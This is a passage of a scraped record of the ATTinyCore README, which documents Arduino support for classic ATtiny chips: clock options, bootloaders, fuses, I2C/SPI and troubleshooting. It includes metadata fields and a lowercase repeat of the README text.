tightly calibrated (so they may need tuning even at 3.3v) and are a few cents less expensive, but suffer from the same problem at higher voltages. Due to these complexities, it is recommended that those planning to use serial (except on a x41, 1634R or 828R at 2.5~3.3v, or with a Micronucleus bootloader) use an external crystal until a tuning solution is available.\nA tuning sketch is planned for a future version of this core. Progress on this has been made - slowly and fitfully. The current plan is for Optiboot bootloader to be optionally burnable with a \"tuning\" sketch - this will write the calibration value to the space between the end of the bootloader and the end of flash, and the bootloader will load this value if it is set. ( #139 ) Micronucleus using internal oscillator already does this using the USB clock as a timebase, and loads it before the sketch\nADC Support\nAll of the supported parts except for the x313-family have an Analog to Digital converter on chip. Single-ended ADC inputs can be read using the ADC channel number or the Ax constant (they can NOT be read using the digital pin number). In addition to the single-ended input channels marked on the pinout diagrams, many also support differential ADC input channels. To use these, simply call analogRead() with the appropriate ADC channel number. To get the ADC channel number, refer to the datasheet - it is listed in the Register Description section of the chapter on the ADC, under the ADMUX register.''\nTimers and PWM\nAll of the supported parts have hardware PWM (timer with output compare functionality) on at least one pin. See the part-specific documentation pages for a chart showing which pins have PWM. In addition to PWM, the on-chip timers are also used for millis() (and other timekeeping functions) and tone() - as well as by many libraries to achieve other functionality. Typically, a timer can only be used for one purpose at a time.\nOn all supported parts, timekeeping functions are on timer0. On all parts except the tiny841/441 tone() is on timer1; on 841/441, in version 1.1.6 and later, tone() is on Timer2 to improve compatibility (on 1.1.5 and earlier, tone() is on Timer1 on all parts). This means that reconfiguring timer0 by manipulating it's registers will break millis() and delay(). Using tone() will prevent PWM from working on PWM pins controlled by Timer1 (Timer2 for 841/441), and manipulating it's registers will break tone(). Because tone() is now on Timer2 on the 841/441, you can use tone() at the same time as other libraries that use Timer1 (such as Servo, TimerOne, and many others).\nMost of the ATtiny parts only have two timers. The attiny841 has a third timer - but be aware that it's Timer2 is very different from the Timer2 on the atmega328p and most other atmega parts - the '841 has a second 16-bit timer (identical to timer1), while the atmega parts usually have an 8-bit asynchronous timer. This means that libraries designed to use Timer2 on the usual Arduino boards (ex, ServoTimer2) cannot be used with the 841.\nBuilt-in tinyNeoPixel library\nThe standard NeoPixel (WS2812/etc) libraries do not support all the clock speeds that this core supports, and some of them only support certain ports. This core includes two libraries for this, both of which are tightly based on the Adafruit_NeoPixel library, tinyNeoPixel and tinyNeoPixel_Static - the latter has a few differences from the standard library (beyond supporting more clocks speeds and ports), in order to save flash. At speeds below 16MHz, you must select the port containing the pin you wish to use from the Tools -> tinyNeoPixel Port menu. This code is not fully tested at \"odd\" clock speeds, but definitely works at 8/10/12/16/20 MHz, and will probably work at other speeds, as long as they are 7.3728 MHz or higher. See the tinyNeoPixel documentation and included examples for more information.\nRetain EEPROM configuration option\nAll non-bootloader board definitions have a menu option to control whether the contents of the EEPROM are erased when programming. This only applies to ISP programming, and you must \"burn bootloader\" to set the fuses to apply this. Because it only applies to ISP programming, it is not available for Bootloader board definitions. On those, EEPROM is never retained, on the reasoning that if you are burning the bootloader to a chip, you are trying to restore it to a \"fresh\" state.\nB. O. D. (brown out detect) configuration option\nBrown-out detection continuously monitors Vcc, and holds the chip in reset state (BOR) if the applied voltage is below a certain threshold. This is a good idea with slow-rising power supplies or where it is expected that the supply voltage could droop below the required operating voltage for the frequency it is running at (see the speed grade specification for the part you're using) - without BOD enabled, this can put the chip into a hung state until manually reset. However, BOD increases power consumption slightly, and hence may be inappropriate in low power applications.\nThe BOD voltage trigger level can be chosen from the tools -> BOD menu. The ATtiny441, 841, 828, and 1634 support independently configuring the BOD mode (active, sampled, disabled) for active and sleep modes (see the applicable datasheet for details). These are configured via the Tools -> BOD Mode (sleep) and Tools -> BOD Mode (active) menus.\nIn all cases, the selected BOD option(s) is/are configured by the fuses, so after changing these, you must \"burn bootloader\" to set the fuses.\nFor Micronucleus boards, only options with are vaguely close to manufacturer's spec and \"disabled\" are available - since with those parts, we know without a doubt what that the clock speed will be, we know what BOD levels would be appropriate. There's not much point to using BOD if the BOD level is so far below spec that the chip would stop running before it was reached.\nOption to disable millis()/micros()\nThe Tools -> millis()/micros() allows you to enable or disable the millis() and micros() timers. If set to enable (the default), millis(), micros() will be available. If set to disable, these will not be available, Serial methods which take a timeout as an argument will not have an accurate timeout (though the actual time will be proportional to the timeout supplied); delay will still work. Disabling millis() and micros() saves flash, and eliminates the millis interrupt every 1-2ms; this is especially useful on parts with very limited flash, as it saves a few hundred bytes.\nMemory Lock Bits, disabling Reset\nATTinyCore will never set lock bits automatically, nor will it set fuses to disable ISP programming (it is intentionally not made available as an option, since after doing that, an HVSP programmer is needed to further reprogram the chip, and inexperienced users would be at risk of bricking their chips this way). The usual workflow when these bits are in use is Set other fuses -> Upload -> Test -> set the lockbits and/or fuses. This can be done from the command line using AVRdude. To expedite the process, you can enable \"Verbose Upload\" in preferences, do \"burn bootloader\" (the board and/or programmer does not need to be present), scroll to the top of the output window - the first line is the avrdude command used to burn the bootloader, including the paths to all the relevant files. It can be used as a template for the command you execute to set the fuse/lock bits. Disabling of reset is currently not an option, either - but for bootloader boards, this may change - VUSB bootloaders which disable reset are in widespread use, seemingly without issue. It will never be an option for non-bootloader boards because of the convoluted workflow required.\nPin Mappings\nATtiny441/841\nATtiny1634\nATtiny828\nATtiny25/45/85\nATtiny24/44/84\nATtiny261/461/861\nATtiny87/167\nATtiny48/88\nATtiny2313/4313\nATtiny43U\nNote that two pin mappings are supported for some devices to retain backwards compatibility with other cores - the pin mapping may be chosen from a menu.\nNote that analog pin numbers (ex A0 ) cannot be used with digitalWrite()/digitalRead()/analogWrite() - all pins have a digital pin number. Analog pin number should only be used for analogRead() - this represents a departure from the behavior used in the official AVR boards. This enables us to expose the advanced ADC functionality available on some of the ATtiny parts with minimal impact, as clearly written code is unlikely to fall afoul of this anyway.\nBuy Breakout boards\nExcept for the x5, x4, x61, and x313-family, these are only available in surface mount packages. Breakout boards are available from my Tindie store (these are the breakout boards used for testing this core), which have the pins numbered to correspond with the pin numbers used in this core. Where applicable, all of these assembled boards have the bootloader installed, and all are set to run at the advertised speed (most are available with several speed/voltage combinations).\n841: Bare boards - Assembled Boards\n1634: Bare boards - Assembled Boards\n828: Bare boards Assembled Boards\nx61-family (861/461/261): Bare boards Assembled Boards\nx7-family (167/87): Bare boards Assembled Boards\nx8-family (48/88): Bare boards Assembled Boards\nATtiny43 (including boost converter) Assembled Boards\nSMD/DIP or DIP ATtiny85 prototyping board\nSMD or DIP ATtiny84 prototyping board\nCaveats\nSome people have problems programming the 841 and 1634 with USBAsp and TinyISP - but this is not readily reproducible. ArduinoAsISP works reliably. In some cases, it has been found that connecting reset to ground while using the ISP programmer fixes things (particularly when using the USBAsp with eXtremeBurner AVR) - if doing this, you must release reset (at least momentarily) after each programming operation. This may be due to bugs in USBAsp firmware - See this thread on the Arduino forums for information on updated USBAsp firmware: http://forum.arduino.cc/index.php?topic=363772 (Links to the new firmware are on pages 5-6 of that thread - the beginning is largely a discussion of the inadequacies of the existing firmware)\nAt >4v, the speed of the internal oscillator on 828R, 1634R and 841 parts increases significantly - enough that serial (and hence the bootloader) does not work. Significant enhancements have been made on this front in 1.4.0; reburning bootloader should sort it out.\nLicense\nATTinyCore itself is released under the LGPL 2.1. It may be used, modified, and distributed, and it may be used as part of an application which, itself, is not open source (though any modifications to these libraries must be released under the LGPL as well). Unlike LGPLv3, if this is used in a commercial product, you are not required to provide means for user to update it. A historical investigation has determined that versions of this core have been released under the LGPLv2.1 in the past - it was an oversight on our part that the license file was omitted from this core previously.\nThe ATTinyCore hardware package (and by extension this repository) contains ATTinyCore as well as libraries and bootloaders. These are released under the same license, unless specified otherwise. For example, tinyNeoPixel and tinyNeoPixel_Static, being based on Adafruit's library, is released under GPLv3, as described in the LICENSE.md in those subfolders and within the body of the library files themselves.\nThis does not apply to any tools or third party programs used by ATTinyCore. Installing ATTinyCore through board manager will install and/or update other tool(s) to compile and/or upload code. Those are covered by separate licenses included in their respective archives.\nAcknowledgements\nThis core was originally based on TCWorld's ATTinyCore, which is in turn based on the arduino-tiny core here: http://code.google.com/p/arduino-tiny/ The ATtiny841 support is based on shimniok's ATtiny x41 core, and the 1634 support on Rambo's ATtiny1634 core.\\\n@per1234, who has been an invaluable resource for myself and others within the Arduino community, specifically having set up the Travis-based CI testing system (which will cease to be used once the other foot drops wrt. Travis terms) and his years of assistance with board manager releases and more.\nThe pinout diagrams are created by @MCUdude, who maintains a number of excellent cores for virtually every Microcontroller you might want to use with Arduino as as it has \"ATmega\" in the name - http://github.com/MCUdude\nMany individuals have contributed various fixes and improvements via GitHub - see the contributor list for the full list.", "link": "https://github.com/SpenceKonde/ATTinyCore", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "attinycore universal\narduino support for almost every classic tinyavr device! supports attiny 1634, 2313/4313, 24/44/84, 441/841, 25/45/85, 261/461/861, 87/167, 48/88, 43 and 828. supports programming vis isp, serial (optiboot - all parts with >4k flash, and all parts with 4k flash for which an 8k version is available) or vusb (micronucleus - where appropriate)\nstate of attinycore\ndevelopment of attinycore is proceeding in the v2.0.0-dev branch.\nplease do not submit pr's against the \"master\" branch! your changes will be lost upon the next release if you do new changes need to go into v2.0.0-dev (which will be my next project after dxcore 1.3.7 release this week)\nit's not usable presently due to incomplete work, but that is what all future releases will be made from. notably, i belive the variant pins_arduino.h files are complete, showcasing both the range of new information available to the core and user code for all parts, and the new, consisitent formatting.\nattiny26 support looks like it may be coming after all....\ncheck it out, we have \"discussions\" now!\nlet's use that, not gitter.\ncurrent strongly recommended ide version: 1.8.13\nusers of 1.6.x versions should use caution with any board manager packages as the handling of dependency versions, at least under 1.6.9, appears to be severely broken, such that installing one packages can break others. for example, dxcore won't work if atytinycore is installed on 1.6.9! - both cores correctly specify their requirements, but the ide does not use the correct versions of the toochain. it is likely that similar bugs involving other tools also manifest here. use 1.8.13 or similar recent version if at all possible; if you are unwilling or unable to update your main arduino ide version, a \"portable\" installation is recommended - the separate copy of ide with portable installation should ensure that what you do in that version does not effect the other version - if you can't use 1.8.13, a portable 1.6.9 version will achieve the same thing, only without the other fixes and improvements that went into the ide since then.\ninstallation\nwiring and required external components\nusing with micronucleus boards\nprogramming guide\nmigration guide - moving to attinycore from a different attiny board package\nattinycore universal\nthis core supports the following processors - essentially every \"classic\" tinyavr processor that makes sense to use with arduino. the modern (post-2016 release) tinyavr parts have their own core, as there is practically zero code at the core level that can be shared with classic parts (in exchange for the cores being totally different, sketches can often be moved between these with little to no effort - not always, but often) click the processor name for part-specific information:\nattiny441, 841 (with or without optiboot or micronucleus bootloader)\nattiny1634 (with or without optiboot bootloader)\nattiny87, 167 (with or without optiboot or micronucleus bootloader)\nattiny25, 45, 85 (with or without optiboot or micronucleus bootloader)\nattiny24, 44, 84 (with or without optiboot or micronucleus bootloader)\nattiny261, 461, 861 (with or without optiboot bootloader)\nattiny48, 88 (with or without optiboot or micronucleus bootloader)\nattiny828 (with or without optiboot bootloader)\nattiny2313, 4313 (no bootloader)\nattiny43 (no bootloader)\nvariants of these are also supported (such as the attiny1634r, attiny2313a or attiny85v)\nnon-supported parts\ntinyavr 0/1/2-series modern tinyavr (with 0, 1, or 2 as next-to-last digit) are supported by my megatinycore instead. they are totally different in every way except the \"t-word\" in the name, and the fact that they're great parts and work well with arduino.\nattiny13/13a are supported by microcore by @mcudude\nattiny26 are not supported by any arduino core. they are the obsolete predecessor to the '261, which itself is ancient). i will accept a pr to add support but will not use my own limited development time for such old and uninspiring parts.\nattiny 4/5/10/11 and any other \"avrrc\" (reduced core) parts. try this core\nquick gotcha list - having trouble, read these!\nwindows users must install micronucleus drivers manually if you want to use micronucleus (vusb) boards on windows, you must manually install the drivers - arduino does not run \"post-install\" tasks for third party libraries (though i am told they recognized how nonsensical this is - a malicious core could still run whatever commands it wanted to by telling the ide that was how to compile sketches for these boards - and will be changing this in the future. note also that the 1.5.0 release does not include working micronucleus upload -----> tool !!!  for windows, this is resolved in 1.5.2.\nduring the install process it will print the path of a post_install.bat that it skipped running. running that will install the drivers - it's easiest if you copy/paste it, as after installation the drivers will be located in c:\\users\\yourusername\\appdata\\local\\arduino15\\packages\\attinycore\\tools\\micronucleus\\2.5-azd1\\ or they can be downloaded from the following url https://azduino.com/bin/micronucleus/drivers-digistump(win).zip . unzip, run the installation batch file.\navrdude: error: could not find usb device with vid=0x16c0 pid=0x5dc vendor=www.fischl.de product='usbasp' vaguely recent versions of avrdude appear to have dropped a few versions of the firmware. if this is the first time you'd installed something that triggered an update here, you may have problems with avrdude. the solution, thankfully, is straightforward.. .\ndownload zadig from http://zadig.akeo.ie\nplug in usbasp\nstart zadig\noptions > list all devices\nselect usbasp from the drop down menu\nselect libusbk(v3.0.7.0) driver\nclick install\nthis core includes part specific documentation - click the links above for your family of chips and read it these describe issues and \"gotchas\" specific to certain chips. be sure to review this documentation!\nproblems dynamically linking libusb-0.1 on linux can occur if arduino was installed through the snap package manager. the arduino ide should always be installed from the tarball available from http://arduino.cc, never from a package manager.\nthere is a bug in the ide that causes compilation errors with some combinations of boards and submenu options on 1.8.5 and earlier on windows. the symptom of this is an error ending in something like c:\\users\\yourusername\\appdata\\local\\temp\\arduino_build_131884/..\\arduino_cache_186227\\core\\core_attinycore_avr_attinyx4_lto_enable,chip_84,clock_8internal,eesave_aenable,bod_disable,pinmapping_anew,millis_enabled,neopixelport_porta_1bc5d2d7fe299bbd4d4a668366e76c74.a: no such file or directory - this is caused by the way it includes all options in the name of the file; where there are many menu options, this will exceed the maximum file name length under windows. this issue impacts many parts on attinycore 1.3.0 and later, and the 841/441 on attinycore 1.2.2 and later. to fix this issue without downgrading attinycore, update to 1.8.6 or later of the ide - 1.8.13 is strongly recommended\nwindows store version sometimes experiences strange issues. the windows store issues are difficult to reproduce on other systems, and no reliable solutions to them are currently known. we recommend using the .zip package or standard installer version of the ide, not the windows store version.\non ides prior to 1.8.13, you need to select the correct version of the programmer. in 1.8.13 only these programmers are shown. as of 1.4.2, the (attinycore) note is removed, as 1.8.13 has had excellent uptake (because it lacks new bugs and greatly improves ux)\nwhen using a chip for the first time, or after changing the clock speed, eesave or bod settings, you must do \"burn bootloader\" to set the fuses, even if you are not using the chip with a bootloader\nproblems programming some parts for first time, especially attiny841/441 these parts are less forgiving of the sck clock rate. i'm not sure why usbasp doesn't seem to be working anymore (it used to, and i haven't changed anything), looking into options there. arduino as isp or usbtinyisp slow will program without issue.\nchips sold as \"attiny85\" with wrong signature - enable verbose upload output, and it will tell you what sig it actually saw. 0x1e9005 means you got scammed (all 0's or all f's is wiring problem, or bricked chip from choosing clock source that isn't present). apparently one or more foreign sellers have been remarking the much cheaper attiny12 as an 85 and ripping people off on ebay/etc.\nfree(): invalid next size (normal) error this error is due to a bug in avrdude ( https://savannah.nongnu.org/bugs/?48776 ) - and it's a spurious error, as when it is displayed, the programming operation has actually completed successfully (you can see for yourself by enabling verbose upload, and noting the successful write before this error is shown. it is unknown under what conditions this error appears, though it has been recorded on a usbtinyisp on linux when bootloading an attiny88 with optiboot.\nwhen using analogread(), use the a# constant to refer to the pin, not the digital pin number. analog channel number (see table in datasheet entry for admux register) can also be used - unlike the official core, you can use analogread() with the differential adc channels (for example).\nwhen using i2c on anything other than the attiny48/88 you must use an i2c pullup resistor on scl and sda (if there isn't already one on the i2c device you're working with - many breakout boards include them). 4.7k or 10k is a good default value. on parts with real hardware i2c, the internal pullups are used, and this is sometimes good enough to work without external pullups; this is not the case for devices without hardware i2c (all devices supported by this core except 48/88) - the internal pullups can't be used here, so you must use external ones. that said, for maximum reliability, you should always use external pullups, even on the t48/88, as the internal pullups are not as strong as the specification requires.\nyou cannot use the pxn notation (ie, pb2, pa1, etc) to refer to pins - these are defined by the compiler-supplied headers, and not to what an arduino user would expect. to refer to pins by port and bit, use pin_pxn (ex, pin_pb2); these are #defined to the arduino pin number for the pin in question, and can be used wherever digital pin numbers can be used. we recommend this method of referring to pins, especially on parts with multiple pinmapping options\nall attiny chips (as well as the vast majority of digital integrated circuits) require a 0.1uf ceramic capacitor between vcc and gnd for decoupling; this should be located as close to the chip as possible (minimize length of wires to cap). devices with multiple vcc pins, or an avcc pin, should use a cap on those pins too. do not be fooled by poorly written tutorials or guides that omit these. yes, i know that in some cases (ex, the x5-family) the datasheet doesn't mention these - but other users as well as myself have had problems when it was omitted on a t85.\nfor low power applications, before entering sleep, remember to turn off the adc (adcsra&=(~(1<<aden))) - otherwise it will waste ~270ua\nwhen in power down sleep mode, the clock is stopped - using a slower clock speed does not save power while sleeping i am asked very frequently about using very low clock speeds in low-power applications. almost invariably, upon further interrogation, the user reveals that they plan to have the part in power-down sleep mode almost all the time. in this case, there is often little to be gained from running at a lower clock speed, since it only effects power use in the brief moments that the chip is awake - even more so because these moments may well be shorter when running at a higher clock speed. clock speeds below 1mhz can present problems while programming due to the programmer using an sck clock speed too fast for the target chip running at such a low system clock speed.\nwhen using the wdt as a reset source and not using a bootloader remember that after reset the wdt will be enabled with minimum timeout. the very first thing your application must do upon restart is reset the wdt (wdt_reset()), clear wdrf flag in mcusr (mcusr&=~(1<<wdrf)) and then turn off or configure the wdt for your desired settings. if using the optiboot bootloader, this is already done for you by the bootloader.\nattinycore features\noptiboot support - serial bootloader for attiny441/841, 44/84, 45/85, 461/861, 48/88, 828, 1634, 87, 167 only)\nthe optiboot bootloader is included for the attiny441, 841, 44, 84, 45, 85, 461, 861, 48, 88, 1634, 828, 87 and 167. for boards with a hardware uart, this runs at 57600 baud at 8 mhz and slower, and 115200 baud above that; for boards without hardware uart, it runs at 19200 baud (on these boards tx/rx pins are the same as the builtin software serial, the ones marked ain0 (tx) and ain1(rx)). on boards with hardware serial, the bootloader uses uart0 or the lin/uart as appropriate (bootloaders that use uart1 for devices that have a second uart are included, prefixed with \"ser1\" - you must flash them manually or modify boards.txt if you wish to use them). once the bootloader is programmed, the target can be programmed over serial; the bootloader will run after reset, just like on a normal arduino. bootloaders are not included for the 2k-flash versions of these parts - more than a quarter of the available flash would go to the bootloader, and the arduino abstraction is already severely constrained with just 2k of flash. for these parts, we recommend isp programming. clock speeds lower than 1mhz are not supported because the resulting baud rates would be so low that it some serial adapters start having problems talking to them. at 1mhz, uploads are painfully slow. we recommend using the bootloader only at 8mhz or higher. if you are trying to save power, it is usually better to run at 8mhz and put the chip to sleep for most of the time.\nthe attiny441/841, attiny1634, attiny44/84, attiny45/85, attiny461/861, attiny48/88 and the attiny x7-family do not have hardware bootloader support. to make the bootloader work, the \"virtual boot\" functionality of optiboot is used. because of this, another vector is used to point to point to the start of the applications - this interrupt cannot be used by the application - under the hood, the bootloader rewrites the reset and \"save\" interrupt vectors, pointing the save vector at the start of the program (where the reset vector would have pointed), and the reset vector to the bootloader (as there is no bootrst fuse). up until version 1.2.0 of this core, the wdt vector was used for this purpose. in 1.2.0 and later, the ee_rdy vector (which is not used by anything in arduino-land - the eeprom library uses a busy-wait) is used instead. if the bootloader was burned with 1.1.5 or earlier of this core, the wdt cannot be used to generate an interrupt (wdt as reset source is fine) - re-burning bootloader with 1.2.0 or later will resolve this.\na warning about virtual boot\nvirtual boot relies on rewriting the vector table, such that the reset vector points to the bootloader. this presents a potential issue: if the bootloader starts to write the first page, but then - for some reason - fails (such as a poorly timed reset right after the programming process begins), the page containing the reset vectors will be erased but not rewritten, with the result being that both the sketch and bootloader are hosed resulting in isp programming being required to revive the chip. see #398\nsee the programming guide for more information on programming parts using optiboot.\nmicronucleus - vusb bootloader for 841, 167, 85, 88 and 84/84a\nit's finally here! as of 1.4.0, we now offer micronucleus (aka digispark) support for some of the more popular boards for these bootloaders. this allows sketches to be uploaded directly via usb, which many users find highly convenient. this comes at a cost in terms of flash - they typically use around 1.5k of flash, and they sometimes have problems connecting to specific usb ports. these boards are available from various vendors; see the part-specific documentation pages for more information on the implementation used on specific parts. for more information on using micronucleus, see the usage documentation.\nchanging the attiny clock speed and other settings\nchanging the attiny clock speed, b.o.d. settings etc, is easy. when an attinycore board is selected from the tools -> board menu, there will appear extra submenus under tools menu where we can set several attiny properties:\ntools > save eeprom: (boards without bootloader only - controls whether eeprom is erased during a chip erase cycle)\ntools > timer 1 clock: (attiny25/45/85 only - allows timer1 to be clocked off the pll for higher frequency pwm)\ntools > lto: (link time optimization makes sketches smaller, but requires avr boards 1.6.11 or later)\ntools > b.o.d level: (trigger voltage for brown out detection - below this voltage, chip will be held in reset)\ntools > chip: (select the part being used )\ntools > clock: (select the desired clock speed)\ntools > b.o.d. mode (active): (441, 841, 1634, 828 only - see b. o. d. section below)\ntools > b.o.d. mode (sleep): (441, 841, 1634, 828 only - see b. o. d. section below)\nafter changing the clock source, bod settings, or whether to save eeprom on chip erase), you must do \"burn bootloader\" with an isp programmer. see programming guide\nsupported clock speeds:\nsupported clock speeds are shown in the menus in descending order of usefulness, ie, the popular clock speeds/sources are at the top, and the weird ones are at the bottom. see the notes for caveats specific to certain clock speeds.\ninternal:\n8 mhz\n1 mhz\n16 mhz (pll clock, x5, x61 only)\n16 mhz \u2021 (aggressively configured 441/841 only)\n4 mhz*** (except on x313, starts up at 1mhz and immediately switches to 4mhz before setup() is run)\n16.5mhz \u2020 ! (pll clock, tweaked, x5, x61 micronucleus only, for usb support)\n12.8mhz \u2020 \u2021 (internal, tweaked hardcore, micronucleus only, for usb support)\n0.5 mhz** \u203c (x313 only)\n512 khz** \u203c (ulp - x41 only)\n256 khz** \u203c (ulp - x41 only)\n128 khz** \u203c (watchdog or ulp, all except 1643, 828)\n64 khz** \u203c (ulp - x41 only)\n32 khz** \u203c (ulp - 1634, 828, x41 only)\nexternal crystal (all except 828, 43 and x8-family):\n20 mhz !\n18.432 mhz* !\n16 mhz\n14.7456 mhz* !\n12 mhz !\n11.0592 mhz* !\n9.216 mhz* !\n8 mhz\n7.3728 mhz* !\n6 mhz !\n4 mhz\nall available clock options for the selected processor will be shown in the tools -> clock menu.\n* these weird crystals are \"uart frequencies\" - these divide evenly to common baud rates, so you can get a perfect match if this is required for your application - typical uart use cases do not require running at one of these uart frequencies, the usual caveats about software serial and baud rate accuracy on classic (pre-2016) avr designs notwithstanding. these crystal options are not available for chips without a uart in versions of attinycore older than 1.1.5, and are never recommended for parts without a hardware serial port.\n** these options are slow enough that many isp programmers may not be able to program them. depending on the isp programmer (and in some cases the firmware on it), there may be a setting or jumper to slow the sck frequency down for programming these parts, or it may automatically figure it out. the sck frequency must be less than 1/6th of the system clock for isp programming. before using a such a low clock speed, consider whether you might be able to get lower power consumption by running at a higher base clock while staying in sleep most of the time - this results in fewer programming headaches, and in many (but not all) use cases results in comparable or lower power consumption.\n*** the 4mhz internal option is useful if you are running near the minimum voltage - the lowest voltage for most of these parts is 1.8v, and at that voltage, they are only rated for 4mhz maximum. this starts up at 1 mhz and then switches to 4 mhz. hence, bootloader performance is very slow, as it doesn't (yet) do this itself.\n\u2020 these speeds support usb when used with the internal clock. available on micronucleus boards only.\n\u2021 aggressively tuned internal oscillators have to be slowed down when writing to eeprom, and then sped back up. we attempt to correct millis timekeeping for this, but you may still see timing glitches. please report any hangs or other bad behavior you observe with these, as this is a very new feature, and more aggressive measures to prevent cpu glitches may be required.\n! micros takes longer to return on these clocks (64/clock cycles per microsecond is not an integer).\n\u203c micros() and delaymicroseconds() require a system clock of 1 mhz or higher.\nwarning particularly in versions prior to 1.5.0, when using weird clock frequencies (those other than 16mhz, 8mhz, 4mhz, 2mhz, 1mhz, 0.5mhz), micros() is significantly slower (~ 110 clocks) (it reports the time at the point when it was called, not the end, however, and the time it gives is pretty close to reality). this combination of performance and accuracy is the result of hand tuning for these clock speeds. for other clock speeds (for example, if you add your own), it will be slower still - hundreds of clock cycles - though the numbers will be reasonably accurate, and reflect the time when it was called. millis() is not effected, only micros() and delay().\nthis differs from the behavior of official arduino core - the \"stock\" micros() executes equally fast at all clock speeds, and instead returns wrong values for \"weird\" clock speeds (64/(clock speed in microseconds, rounded down to integer), rounded down to integer. 12.8 mhz is a special case and is handled exactly.\nthanks to @cburstedde for his work this his work towards making this suck less in the 1.5.0 release!\nusing external clock on 48, 88, and 828 (new in 1.3.3)\nthese parts do not support using an external crystal. external clock, however, is supported - this requires an external clock source (not just a crystal) connected to the clki pin. danger if this clock source is not present, you must supply a clock source to clki pin before it can be reprogrammed, including to use a different clock source. the external clock option is available through the ide only for parts which don't support an external crystal. this is not the same as external crystal - do not use this option if you are unsure about the difference between external clock and external crystal! external clock sources are commonly sold as \"oscillators\", we recommend the kc5032a-series for it's low cost and wide operating voltage range of 1.6~5.5v (ie, the entire operating range of these parts!). every other oscillator available from digikey has a narrower voltage range (often 3.3v or 5v +/- 10%, though some work from wider ranges). through-hole units are available, but expensive, and all have the restrictive supply voltage requirements. if selecting your own oscillator, you want an \"xo\" type.\nusing external clock (instead of crystal) on other parts\nthe use of an external clock - that is, a single wire with an appropriate clock signal is supplied to the xtal1 pin from an external source, is possible using this core. this is an advanced feature, and is not supported directly through the ide (except as noted above) to reduce the risk of people confusing it with external crystal and bricking their chips (if external clock is set as clock source when actually using external crystal, you must supply a clock signal on xtal1 to program the chip again, including to set it to use a crystal again). to use an external clock:\nconnect the chip, and ensure that the external clock source is present.\nselect the desired clock speed with the external crystal option.\nfrom file -> preferences, ensure that \"show verbose output\" is enabled for \"uploading\".\nconnect your isp programmer.\nchoose \"burn bootloader\". this will set all the selected fuses, only it will be set to use a crystal (this is fine, the external clock will substitute this). however, at this point the xtal2 pin will not be usable as gpio.\nscroll up in the bottom pane of the ide to the top of the upload output. the first line will be the avrdude command used to burn the bootloader. copy this into a text editor. if the command includes -e, remove -e and everything after it. if it just points to the bootloader hex file, remove \"-uflash:w:(path to bootloader .hex file):i\" from the end of the command.\nadd -ulfuse:w:0xf0:m to the end of the command.\ncopy/paste this command into a command window, and hit return. your chip should now be running on the external clock, and the xtal2 pin (but not the xtal1 pin) will be available for use normally.\nwhen compiling for and uploading to your now-externally-clocked part, use the external crystal option corresponding to the clock speed you are using.\ndetermining clock speed and source from within the sketch\nthe clock speed is made available via the f_cpu #define - you can test this using #if macro\nin version 1.3.3 and later, the clock source is also made available via the clock_source #define. clock_source can take one of the following values (as of 1.4.0, it is expanded to cover a few weird clocking situations: the low 4 bits identify the source, and high 4 bits identify special things regarding it:\n0 - internal 8mhz oscillator, not prescaled, or prescaled to 1 mhz (ie, fully set by fuses)\n1 - external crystal\n2 - external clock (only available within the core on the 48, 88 and 828, as described above - note that above steps to use external clock on other parts, this will still be 1, not 2; as far as the core knows, it's a crystal)\n3 - internal wdt oscillator (not available on the x41, 1634, and 828)\n4 - internal ulp oscillator (available only on the x41, 1634, and 828)\n5 - internal 4mhz oscillator (present only on the x313 parts - if the 8mhz internal oscillator is prescaled to 4mhz, clock_source will be 0, not 5)\n6 - internal pll (x5 and x61 only)\n15 or 0x10 (ie, 0x10 | 0) - internal oscillator with prescaling not set by fuses (ie, not 1 mhz or 8 mhz - ie, 2 or 4 mhz)\n17 or 0x11 (ie, 0x10 | 1) - external crystal at 16mhz, which may be prescaled to get lower frequencies (for digispark pro attiny167)\n18 or 0x12 (ie, 0x10 | 2) - external clock at 16mhz, which may be prescaled to get lower frequencies (for mh tiny attiny88)\nrefer to pins by port/pin\ninstead of referring to pins by the digital pin numbers, it is now (as of 1.4.0) possible to refer to pins based on their port and pin number within the port. we recommend this method of referring to pins in all cases, as it can be more easily cross-referenced with the datasheet, and is independent of pin mapping (for devices with multiple pin mapping options). it also helps to build good mental habits with regards to thinking about pins in the context of ports, which is helpful when writing code where more advanced techniques are needed. for every pin, the core supplies a constant of the form pin_pxn, where x is the port letter, and n is the bit of the pin within that port; this is a #define set to the digital pin number corresponding to it. for example, pin_pa2 refers to bit 2 in porta. on the attiny167, where there are three different pin mappings, all radically different, analogwrite(pin_pa2,128) will always generate a squarewave on the same pin, and the code can be moved between pinmappings without concern.\nassembler listing generation\nin version 1.2.2 and later, sketch -> export compiled binary will generate an assembly listing in the sketch folder; this is particularly useful when attempting to reduce flash usage, as you can see how much flash is used by different functions.\nlink-time optimization (lto) support\nlink time optimization is enabled by default. if compiling with very old versions of the ide, this must be disabled. cases do exist where this setting can change behavior of a sketch; in all cases where this has been observed, a bug in the code was hidden by one setting or the other, and/or undefined behavior was invoked. this is a problem with your code, not the core.\nmakefile support\nfor those who prefer to compile with a makefile instead of the ide, sketches can be compiled with https://github.com/sudar/arduino-makefile - see the makefile documentation for more information on specific steps needed for this process.\ni2c support\nyou must have external pullup resistors installed - unlike devices with a real hardware twi port, the internal pullups cannot be used with usi-based i2c to make simple cases (short wires, small number of tolerant slave devices) work. in all cases, including parts with hardware i2c where it may work sometimes, you should always use external pullup resistors, as the internal ones are far weaker than the i2c standard requires for reliable operation.\non the following chips, i2c functionality can be achieved with the hardware usi. as of version 1.1.3 this is handled transparently via the special version of the wire library included with this core. be aware that usi-based i2c is not available when usi-based spi is in use.\nattiny x5 (25/45/85)\nattiny x4 (24/44/84)\nattiny x61 (262/461/861)\nattiny x7 (87/167)\nattiny x313 (2313/4313)\nattiny1634\non the following chips, slave i2c functionality is provided in hardware, but a software implementation must be used for master functionality. this is done automatically with the included wire library. in versions prior to 1.2.2, usi on these devices is a flash-hog; this has been greatly improved in 1.2.2.\nattiny828\nattiny x41 (441/841)\non the following chips, full master/slave i2c functionality is provided in hardware and the wire library uses it:\nattiny x8 (48, 88)\nspi support:\non the following chips, full spi functionality is provided in hardware, and works identically to spi on atmega chips:\nattiny828\nattiny x7 (87/167) (it has both a usi and full spi, but the spi library will use the spi hardware)\nattiny x41 (441/841)\nattiny x8 (48, 88)\non the following chips, spi functionality can be achieved with the hardware usi - as of version 1.1.3 of this core, this should be handled transparently via the spi library. take care to note that the usi does not have miso/mosi, it has di/do; when operating in master mode, di is miso, and do is 